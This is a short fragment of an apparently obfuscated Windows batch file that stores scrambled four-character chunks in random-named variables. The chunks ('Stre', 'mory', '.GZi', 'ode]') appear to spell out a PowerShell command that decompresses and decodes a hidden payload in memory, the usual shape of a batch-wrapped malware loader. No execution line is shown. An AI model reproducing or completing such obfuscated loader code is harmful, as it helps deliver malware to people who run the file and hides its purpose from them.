@echo off
set "rfNucwkqIC= = $"
set "jThomvxVfT=Pyo."
set "qlrMfqbqPM=donO"
set "ksjLJlYAlg=ode]"
set "ieKgfbvivO=$cMM"
set "TQDYQsXiOJ=3); "
set "SKHTCYtdzK=oin "
set "dKXvBfNweu=.GZi"
set "zLULrRFwSt=sion"
set "wTXywqvdoh=;$am"
set "dxbpOfguIr=Stre"
set "ZShRrUguiH=S46e"
set "WzuBNPxdrI=mory"
